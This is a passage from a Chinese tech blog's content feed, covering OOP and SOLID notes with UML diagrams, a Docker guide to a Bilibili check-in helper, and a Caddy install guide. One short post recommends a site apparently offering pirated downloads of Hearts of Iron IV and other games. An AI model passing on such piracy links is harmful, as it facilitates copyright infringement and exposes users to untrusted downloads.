class="line">        System.out.println(&quot;Instument is playing...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public class Wind extends Instrument &#123;</span><br><span class="line"></span><br><span class="line">    public void play() &#123;</span><br><span class="line">        System.out.println(&quot;Wind is playing...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public class Percussion extends Instrument &#123;</span><br><span class="line"></span><br><span class="line">    public void play() &#123;</span><br><span class="line">        System.out.println(&quot;Percussion is playing...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public class Music &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        List&lt;Instrument&gt; instruments = new ArrayList&lt;&gt;();</span><br><span class="line">        instruments.add(new Wind());</span><br><span class="line">        instruments.add(new Percussion());</span><br><span class="line">        for(Instrument instrument : instruments) &#123;</span><br><span class="line">            instrument.play();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Wind is playing...</span><br><span class="line">Percussion is playing...</span><br></pre></td></tr></table></figure><h2 id="二、类图"><a href="#二、类图" class="headerlink" title="二、类图"></a>二、类图</h2><p>以下类图使用 <a href="https://www.planttext.com/">PlantUML</a> 绘制，更多语法及使用请参考：<a href="http://plantuml.com/">http://plantuml.com/</a> 。</p><h3 id="泛化关系-Generalization"><a href="#泛化关系-Generalization" class="headerlink" title="泛化关系 (Generalization)"></a>泛化关系 (Generalization)</h3><p>用来描述继承关系，在 Java 中使用 extends 关键字。</p><p><img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/c0874e0a-dba3-467e-9c86-dd9313e0843e.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@startuml</span><br><span class="line"></span><br><span class="line">title Generalization</span><br><span class="line"></span><br><span class="line">class Vihical</span><br><span class="line">class Car</span><br><span class="line">class Trunck</span><br><span class="line"></span><br><span class="line">Vihical &lt;-- Car</span><br><span class="line">Vihical &lt;-- Trunck</span><br><span class="line"></span><br><span class="line">@enduml</span><br></pre></td></tr></table></figure><h3 id="实现关系-Realization"><a href="#实现关系-Realization" class="headerlink" title="实现关系 (Realization)"></a>实现关系 (Realization)</h3><p>用来实现一个接口，在 Java 中使用 implements 关键字。</p><p><img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/83d466bd-946b-4430-854a-cf7b0696d4c8.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@startuml</span><br><span class="line"></span><br><span class="line">title Realization</span><br><span class="line"></span><br><span class="line">interface MoveBehavior</span><br><span class="line">class Fly</span><br><span class="line">class Run</span><br><span class="line"></span><br><span class="line">MoveBehavior &lt;.. Fly</span><br><span class="line">MoveBehavior &lt;.. Run</span><br><span class="line"></span><br><span class="line">@enduml</span><br></pre></td></tr></table></figure><h3 id="聚合关系-Aggregation"><a href="#聚合关系-Aggregation" class="headerlink" title="聚合关系 (Aggregation)"></a>聚合关系 (Aggregation)</h3><p>表示整体由部分组成，但是整体和部分不是强依赖的，整体不存在了部分还是会存在。</p><p><img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/a0ce43b7-afa8-4397-a96e-5c12a070f2ae.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">@startuml</span><br><span class="line"></span><br><span class="line">title Aggregation</span><br><span class="line"></span><br><span class="line">class Computer</span><br><span class="line">class Keyboard</span><br><span class="line">class Mouse</span><br><span class="line">class Screen</span><br><span class="line"></span><br><span class="line">Computer o-- Keyboard</span><br><span class="line">Computer o-- Mouse</span><br><span class="line">Computer o-- Screen</span><br><span class="line"></span><br><span class="line">@enduml</span><br></pre></td></tr></table></figure><h3 id="组合关系-Composition"><a href="#组合关系-Composition" class="headerlink" title="组合关系 (Composition)"></a>组合关系 (Composition)</h3><p>和聚合不同，组合中整体和部分是强依赖的，整体不存在了部分也不存在了。比如公司和部门，公司没了部门就不存在了。但是公司和员工就属于聚合关系了，因为公司没了员工还在。</p><p><img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/6a88a398-c494-41f5-bb62-9f7fb811df7c.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@startuml</span><br><span class="line"></span><br><span class="line">title Composition</span><br><span class="line"></span><br><span class="line">class Company</span><br><span class="line">class DepartmentA</span><br><span class="line">class DepartmentB</span><br><span class="line"></span><br><span class="line">Company *-- DepartmentA</span><br><span class="line">Company *-- DepartmentB</span><br><span class="line"></span><br><span class="line">@enduml</span><br></pre></td></tr></table></figure><h3 id="关联关系-Association"><a href="#关联关系-Association" class="headerlink" title="关联关系 (Association)"></a>关联关系 (Association)</h3><p>表示不同类对象之间有关联，这是一种静态关系，与运行过程的状态无关，在最开始就可以确定。因此也可以用 1 对 1、多对 1、多对多这种关联关系来表示。比如学生和学校就是一种关联关系，一个学校可以有很多学生，但是一个学生只属于一个学校，因此这是一种多对一的关系，在运行开始之前就可以确定。</p><p><img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/a3e4dc62-0da5-4d22-94f2-140078281812.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">@startuml</span><br><span class="line"></span><br><span class="line">title Association</span><br><span class="line"></span><br><span class="line">class School</span><br><span class="line">class Student</span><br><span class="line"></span><br><span class="line">School &quot;1&quot; - &quot;n&quot; Student</span><br><span class="line"></span><br><span class="line">@enduml</span><br></pre></td></tr></table></figure><h3 id="依赖关系-Dependency"><a href="#依赖关系-Dependency" class="headerlink" title="依赖关系 (Dependency)"></a>依赖关系 (Dependency)</h3><p>和关联关系不同的是，依赖关系是在运行过程中起作用的。A 类和 B 类是依赖关系主要有三种形式：</p><ul><li>A 类是 B 类方法的局部变量；</li><li>A 类是 B 类方法的参数；</li><li>A 类向 B 类发送消息，从而影响 B 类发生变化。</li></ul><p><img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/379444c9-f1d1-45cd-b7aa-b0c18427d388.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">@startuml</span><br><span class="line"></span><br><span class="line">title Dependency</span><br><span class="line"></span><br><span class="line">class Vihicle &#123;</span><br><span class="line">    move(MoveBehavior)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface MoveBehavior &#123;</span><br><span class="line">    move()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">note &quot;MoveBehavior.move()&quot; as N</span><br><span class="line"></span><br><span class="line">Vihicle ..&gt; MoveBehavior</span><br><span class="line"></span><br><span class="line">Vihicle .. N</span><br><span class="line"></span><br><span class="line">@enduml</span><br></pre></td></tr></table></figure><h2 id="三、设计原则"><a href="#三、设计原则" class="headerlink" title="三、设计原则"></a>三、设计原则</h2><h3 id="S-O-L-I-D"><a href="#S-O-L-I-D" class="headerlink" title="S.O.L.I.D"></a>S.O.L.I.D</h3><p>简写</p><p>全拼</p><p>中文翻译</p><p>SRP</p><p>The Single Responsibility Principle</p><p>单一责任原则</p><p>OCP</p><p>The Open Closed Principle</p><p>开放封闭原则</p><p>LSP</p><p>The Liskov Substitution Principle</p><p>里氏替换原则</p><p>ISP</p><p>The Interface Segregation Principle</p><p>接口分离原则</p><p>DIP</p><p>The Dependency Inversion Principle</p><p>依赖倒置原则</p><h4 id="1-单一责任原则"><a href="#1-单一责任原则" class="headerlink" title="1. 单一责任原则"></a>1. 单一责任原则</h4><blockquote><p>修改一个类的原因应该只有一个。</p></blockquote><p>换句话说就是让一个类只负责一件事，当这个类需要做过多事情的时候，就需要分解这个类。</p><p>如果一个类承担的职责过多，就等于把这些职责耦合在了一起，一个职责的变化可能会削弱这个类完成其它职责的能力。</p><h4 id="2-开放封闭原则"><a href="#2-开放封闭原则" class="headerlink" title="2. 开放封闭原则"></a>2. 开放封闭原则</h4><blockquote><p>类应该对扩展开放，对修改关闭。</p></blockquote><p>扩展就是添加新功能的意思，因此该原则要求在添加新功能时不需要修改代码。</p><p>符合开闭原则最典型的设计模式是装饰者模式，它可以动态地将责任附加到对象上，而不用去修改类的代码。</p><h4 id="3-里氏替换原则"><a href="#3-里氏替换原则" class="headerlink" title="3. 里氏替换原则"></a>3. 里氏替换原则</h4><blockquote><p>子类对象必须能够替换掉所有父类对象。</p></blockquote><p>继承是一种 IS-A 关系，子类需要能够当成父类来使用，并且需要比父类更特殊。</p><p>如果不满足这个原则，那么各个子类的行为上就会有很大差异，增加继承体系的复杂度。</p><h4 id="4-接口分离原则"><a href="#4-接口分离原则" class="headerlink" title="4. 接口分离原则"></a>4. 接口分离原则</h4><blockquote><p>不应该强迫客户依赖于它们不用的方法。</p></blockquote><p>因此使用多个专门的接口比使用单一的总接口要好。</p><h4 id="5-依赖倒置原则"><a href="#5-依赖倒置原则" class="headerlink" title="5. 依赖倒置原则"></a>5. 依赖倒置原则</h4><blockquote><p>高层模块不应该依赖于低层模块，二者都应该依赖于抽象；<br>抽象不应该依赖于细节，细节应该依赖于抽象。</p></blockquote><p>高层模块包含一个应用程序中重要的策略选择和业务模块，如果高层模块依赖于低层模块，那么低层模块的改动就会直接影响到高层模块，从而迫使高层模块也需要改动。</p><p>依赖于抽象意味着：</p><ul><li>任何变量都不应该持有一个指向具体类的指针或者引用；</li><li>任何类都不应该从具体类派生；</li><li>任何方法都不应该覆写它的任何基类中的已经实现的方法。</li></ul><h3 id="其他常见原则"><a href="#其他常见原则" class="headerlink" title="其他常见原则"></a>其他常见原则</h3><p>除了上述的经典原则，在实际开发中还有下面这些常见的设计原则。</p><p>简写</p><p>全拼</p><p>中文翻译</p><p>LOD</p><p>The Law of Demeter</p><p>迪米特法则</p><p>CRP</p><p>The Composite Reuse Principle</p><p>合成复用原则</p><p>CCP</p><p>The Common Closure Principle</p><p>共同封闭原则</p><p>SAP</p><p>The Stable Abstractions Principle</p><p>稳定抽象原则</p><p>SDP</p><p>The Stable Dependencies Principle</p><p>稳定依赖原则</p><h4 id="1-迪米特法则"><a href="#1-迪米特法则" class="headerlink" title="1. 迪米特法则"></a>1. 迪米特法则</h4><p>迪米特法则又叫作最少知识原则（Least Knowledge Principle，简写 LKP），就是说一个对象应当对其他对象有尽可能少的了解，不和陌生人说话。</p><h4 id="2-合成复用原则"><a href="#2-合成复用原则" class="headerlink" title="2. 合成复用原则"></a>2. 合成复用原则</h4><p>尽量使用对象组合，而不是通过继承来达到复用的目的。</p><h4 id="3-共同封闭原则"><a href="#3-共同封闭原则" class="headerlink" title="3. 共同封闭原则"></a>3. 共同封闭原则</h4><p>一起修改的类，应该组合在一起（同一个包里）。如果必须修改应用程序里的代码，我们希望所有的修改都发生在一个包里（修改关闭），而不是遍布在很多包里。</p><h4 id="4-稳定抽象原则"><a href="#4-稳定抽象原则" class="headerlink" title="4. 稳定抽象原则"></a>4. 稳定抽象原则</h4><p>最稳定的包应该是最抽象的包，不稳定的包应该是具体的包，即包的抽象程度跟它的稳定性成正比。</p><h4 id="5-稳定依赖原则"><a href="#5-稳定依赖原则" class="headerlink" title="5. 稳定依赖原则"></a>5. 稳定依赖原则</h4><p>包之间的依赖关系都应该是稳定方向依赖的，包要依赖的包要比自己更具有稳定性。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li>Java 编程思想</li><li>敏捷软件开发：原则、模式与实践</li><li><a href="http://www.cnblogs.com/shanyou/archive/2009/09/21/1570716.html">面向对象设计的 SOLID 原则</a></li><li><a href="http://design-patterns.readthedocs.io/zh_CN/latest/read_uml.html#generalization">看懂 UML 类图和时序图</a></li><li><a href="http://www.cnblogs.com/wolf-sun/p/UML-Sequence-diagram.html">UML 系列——时序图（顺序图）sequence diagram</a></li><li><a href="http://blog.csdn.net/jianyuerensheng/article/details/51602015">面向对象编程三大特性 —— 封装、继承、多态</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面向对象编程 </tag>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分享一个可以下载钢四mod的网站，更新非常快，各种mod都有 </title>
      <link href="/11d7a5ef.html"/>
      <url>/11d7a5ef.html</url>
      
        <content type="html"><![CDATA[<p>需要下mod的离线玩家，可以用这个网站下载钢四mod。</p><p>钢四mod下载网站：</p><p><a href="https://hearts-of-iron-4.smods.ru/">https://hearts-of-iron-4.smods.ru/</a></p><p>在分享一个可以下载钢四游戏本体的网站，输入英文名Hearts of Iron IV就能搜索到各种版本的本体资源，其他p社游戏，输入英文名搜索，也可以下载</p><p>在分享一个可以下载钢四游戏本体的网站：<br><a href="https://www.skidrowreloaded.com/">https://www.skidrowreloaded.com/</a></p>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mod </tag>
            
            <tag> P社 </tag>
            
            <tag> HOI4 </tag>
            
            <tag> 钢四 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker搭建哔哩哔哩签到脚本</title>
      <link href="/240.html"/>
      <url>/240.html</url>
      
        <content type="html"><![CDATA[<h2 id="安装docker和docker-compose"><a href="#安装docker和docker-compose" class="headerlink" title="安装docker和docker compose"></a>安装docker和docker compose</h2><p>我们使用宝塔的Docker管理器来一键安装Docker。</p><p>在软件商店内搜索Dcoker，直接安装第一个应用即可。</p><p><img src="https://cos.gjcloak.xyz/pigo/202301110906759.webp?imageMogr2/format/webp/interlace/1/quality/80"></p><p>现在宝塔安装 docker 会自动安装 docker compose 。</p><p>因此，安装完成后通过<code>docker-compose version</code>和<code>docker -v</code>查看是否安装成功。</p><p>当然，如果你没使用宝塔，那可以通过<a href="%5BDocker" title="Engine installation overview  Docker Documentation](https://docs.docker.com/engine/install/">官网</a>)的方法来进行安装docker</p><h2 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h2><ul><li>使用国内git镜像拉取docker-bilibili-helper仓库</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com.npmjs.org/SuperNG6/docker-bilibili-helper</span><br></pre></td></tr></table></figure><ul><li>移动到docker-bilibili-helper文件夹内</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd docker-bilibili-helper</span><br></pre></td></tr></table></figure><ul><li>运行脚本,一键安装</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash install.sh</span><br></pre></td></tr></table></figure><ul><li>做完这些操作之后应该能在宝塔面板-Docker管理器中看到一个名为bilibili-helper的容器</li></ul><p><img src="https://cos.gjcloak.xyz/pigo/202301111115370.png?imageMogr2/format/webp/interlace/1/quality/80"></p><h2 id="获取用户信息"><a href="#获取用户信息" class="headerlink" title="获取用户信息"></a>获取用户信息</h2><ul><li>浏览器打开并登录 <a href="https://www.bilibili.com/">bilibili</a> 网站</li><li>按 F12 打开 「开发者工具」 打开 网络&#x2F;NetWork -&gt; 找到并点击 nav 请求</li><li>下拉请求详情，复制完整的 cookie 和 UA</li></ul><p><img src="https://cos.gjcloak.xyz/pigo/202301111120721.webp?imageMogr2/format/webp/interlace/1/quality/80"></p><h2 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h2><p>自定义参数请自行查阅文档，一般默认即可：<br><a href="https://hub.docker.com/r/superng6/bilibili-helper">superng6&#x2F;bilibili-helper – Docker Image Docker Hub</a></p><p>需要修改的配置文件有两个，一个是docker-bilibili-helper文件夹内的docker-compose.yml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">version: &quot;3&quot;</span><br><span class="line"> </span><br><span class="line">services:</span><br><span class="line">  bilibili-helper:</span><br><span class="line">    image: superng6/bilibili-helper:latest</span><br><span class="line">    container_name: bilibili-helper</span><br><span class="line">    environment:</span><br><span class="line">      - PUID=0</span><br><span class="line">      - PGID=0</span><br><span class="line">      - TZ=Asia/Shanghai</span><br><span class="line">      - TASK=1d</span><br><span class="line">      - DEDEUSERID=</span><br><span class="line">      - SESSDATA=</span><br><span class="line">      - BILI_JCT=</span><br><span class="line">      - SERVERPUSHKEY=</span><br><span class="line">      - CUSP=false</span><br><span class="line">      - CRON=false</span><br><span class="line">    volumes:</span><br><span class="line">      - ./appdata/config:/config</span><br><span class="line">    restart: unless-stopped</span><br></pre></td></tr></table></figure><p>参数说明</p><p>Name</p><p>Value</p><p>备注</p><p>PUID</p><p>Linux 用户 ID（以 root 用户权限运行填写 0）</p><p>PGID</p><p>Linux 组 ID（以 root 用户权限运行填写 0）</p><p>TZ</p><p>系统时区（默认上海时区）</p><p>CUSP</p><p>自定义配置文件（默认禁用）</p><p>TASK</p><p>执行任务的间隔时间（1d 表示 1 天，1h 表示 1 小时）</p><p>CRON</p><p>true 时会禁用 task，使用 cron，请手动编辑&#x2F;config&#x2F;bh-crontab （需重启容器）</p><p>docker 镜像环境变量</p><p>DEDEUSERID</p><p>从 Cookie 中获取</p><p>v2.x 版本弃用</p><p>SESSDATA</p><p>从 Cookie 中获取</p><p>v2.x 版本弃用</p><p>BILI_JCT</p><p>从 Cookie 中获取</p><p>v2.x 版本弃用</p><p>SERVERPUSHKEY</p><p>通过 server 酱推送执行结果到微信(可选项)</p><p>v2.x 版本弃用</p><p>TELEGRAMBOTTOKEN</p><p>Telegram Bot 的 HTTP API (详见<a href="https://github.com/JunzhouLiu/BILIBILI-HELPER-PRE">BILIBILI-HELPER</a>）</p><p>v2.x 版本弃用</p><p>TELEGRAMCHATID</p><p>Telegram 上 userinfobot 返回的 ID</p><p>v2.x 版本弃用</p><p>另一个是脚本的配置文件config.json，该文件的路径取决于docker-compose.yml 文件中 volumes 参数中冒号(:)下边所填写的内容，默认在.&#x2F;appdata&#x2F;config文件夹内，在该配置文件内需要将之前获取到的Cookie (必须) 和UA(必须)填写到对应位置，消息推送推荐使用钉钉机器人，配置钉钉机器人时需要在DING_TALK_URL中填写完整的url，安全验证我这边选择了“加签”，修改完后重启容器即完成配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;biliVerify&quot;: &#123;</span><br><span class="line">        &quot;biliCookies&quot;: &quot;填写上边获取到的Cookie&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;taskConfig&quot;: &#123;</span><br><span class="line">        &quot;skipDailyTask&quot;: false,</span><br><span class="line">        &quot;matchGame&quot;: false,</span><br><span class="line">        &quot;showHandModel&quot;: false,</span><br><span class="line">        &quot;predictNumberOfCoins&quot;: 1,</span><br><span class="line">        &quot;minimumNumberOfCoins&quot;: 100,</span><br><span class="line">        &quot;taskIntervalTime&quot;: 20,</span><br><span class="line">        &quot;numberOfCoins&quot;: 5,</span><br><span class="line">        &quot;coinAddPriority&quot;: 1,</span><br><span class="line">        &quot;reserveCoins&quot;: 10,</span><br><span class="line">        &quot;selectLike&quot;: 0,</span><br><span class="line">        &quot;monthEndAutoCharge&quot;: true,</span><br><span class="line">        &quot;giveGift&quot;: true,</span><br><span class="line">        &quot;silver2Coin&quot;: true,</span><br><span class="line">        &quot;upLive&quot;: &quot;0&quot;,</span><br><span class="line">        &quot;chargeForLove&quot;: &quot;14602398&quot;,</span><br><span class="line">        &quot;chargeDay&quot;: 28,</span><br><span class="line">        &quot;devicePlatform&quot;: &quot;ios&quot;,</span><br><span class="line">        &quot;userAgent&quot;: &quot;填写UA&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;pushConfig&quot;: &#123;</span><br><span class="line">        &quot;SC_KEY&quot;: &quot;&quot;,</span><br><span class="line">        &quot;SCT_KEY&quot;: &quot;&quot;,</span><br><span class="line">        &quot;TG_BOT_TOKEN&quot;: &quot;&quot;,</span><br><span class="line">        &quot;TG_USER_ID&quot;: &quot;&quot;,</span><br><span class="line">        &quot;TG_USE_CUSTOM_URL&quot;: false,</span><br><span class="line">        &quot;DING_TALK_URL&quot;: &quot;&quot;,</span><br><span class="line">        &quot;DING_TALK_SECRET&quot;: &quot;&quot;,</span><br><span class="line">        &quot;PUSH_PLUS_TOKEN&quot;: &quot;&quot;,</span><br><span class="line">        &quot;WE_COM_GROUP_TOKEN&quot;: &quot;&quot;,</span><br><span class="line">        &quot;WE_COM_APP_CORPID&quot;: &quot;&quot;,</span><br><span class="line">        &quot;WE_COM_APP_CORP_SECRET&quot;: &quot;&quot;,</span><br><span class="line">        &quot;WE_COM_APP_AGENT_ID&quot;: 0,</span><br><span class="line">        &quot;WE_COM_APP_MEDIA_ID&quot;: &quot;&quot;,</span><br><span class="line">        &quot;WE_COM_APP_TO_USER&quot;: &quot;&quot;,</span><br><span class="line">        &quot;PROXY_HTTP_HOST&quot;: &quot;&quot;,</span><br><span class="line">        &quot;PROXY_SOCKET_HOST&quot;: &quot;&quot;,</span><br><span class="line">        &quot;PROXY_PORT&quot;: 0</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="自动更新-bilibili-helper"><a href="#自动更新-bilibili-helper" class="headerlink" title="自动更新 bilibili-helper"></a>自动更新 bilibili-helper</h2><p>使用 watchtower 每天早上 4 点检查更新 bilibili-helper</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">  --name watchtower \</span><br><span class="line">  --restart=always \</span><br><span class="line">  -e TZ=Asia/Shanghai \</span><br><span class="line">  -v /var/run/docker.sock:/var/run/docker.sock \</span><br><span class="line">  containrrr/watchtower --cleanup --schedule &quot;0 0 4 * * *&quot; \</span><br><span class="line">  bilibili-helper</span><br></pre></td></tr></table></figure><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p><a href="https://hub.docker.com/r/superng6/bilibili-helper">superng6&#x2F;bilibili-helper - Docker Image Docker Hub</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
            <tag> bilibili </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Caddy安装与配置</title>
      <link href="/235.html"/>
      <url>/235.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>Caddy是一款基于Go语言编写的强大且可扩展的平台，可以给你的站点、服务和应用程序提供服务。如果你是Caddy的新手，那么你提供Web服务的方式即将改变。</p></blockquote><p>本文主要介绍了在 <code>Debian、Ubuntu、Raspbian</code> 系统上安装Caddy方法。</p><h2 id="Caddy的安装"><a href="#Caddy的安装" class="headerlink" title="Caddy的安装"></a>Caddy的安装</h2><p>安装此软件包会自动启动将Caddy作为systemd服务（名称为caddy）运行，另外，还有一个名为caddy-api可供使用，它默认没有被启用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install -y debian-keyring debian-archive-keyring apt-transport-https</span><br><span class="line">curl -1sLf &#x27;https://dl.cloudsmith.io/public/caddy/stable/gpg.key&#x27;  sudo gpg --dearmor -o /usr/share/keyrings/caddy-stable-archive-keyring.gpg</span><br><span class="line">curl -1sLf &#x27;https://dl.cloudsmith.io/public/caddy/stable/debian.deb.txt&#x27;  sudo tee /etc/apt/sources.list.d/caddy-stable.list</span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install caddy</span><br></pre></td></tr></table></figure><h2 id="Caddy的服务管理"><a href="#Caddy的服务管理" class="headerlink" title="Caddy的服务管理"></a>Caddy的服务管理</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable caddy.service   # 开机启动</span><br><span class="line">systemctl start caddy.service    # 启动</span><br><span class="line">systemctl stop caddy.service     # 停止</span><br><span class="line">systemctl restart caddy.service  # 重启</span><br><span class="line">systemctl status caddy.service   # 查看状态</span><br><span class="line">systemctl daemon-reload          # 重载配置</span><br></pre></td></tr></table></figure><h2 id="配置-Caddy"><a href="#配置-Caddy" class="headerlink" title="配置 Caddy"></a>配置 Caddy</h2><p>安装成功后，默认生成的caddy配置文件<code>Caddyfile</code>中的部分信息，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># domain name.</span><br><span class="line">:80</span><br><span class="line"></span><br><span class="line"># Set this path to your site&#x27;s directory.</span><br><span class="line">root * /usr/share/caddy</span><br><span class="line"></span><br><span class="line"># Enable the static file server.</span><br><span class="line">file_server</span><br><span class="line"></span><br><span class="line"># Another common task is to set up a reverse 